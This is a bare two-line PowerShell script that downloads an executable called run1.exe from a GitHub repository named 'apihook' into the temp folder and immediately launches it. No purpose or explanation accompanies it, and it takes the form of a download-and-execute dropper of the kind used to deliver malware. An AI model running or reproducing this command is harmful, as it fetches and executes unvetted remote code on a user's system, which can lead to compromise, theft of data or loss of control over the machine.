Invoke-WebRequest -Uri 'https://github.com/mayank1love/apihook/raw/master/run1.exe' -OutFile $env:temp\run1.exe
Start-Process -Filepath "$env:temp/run1.exe"
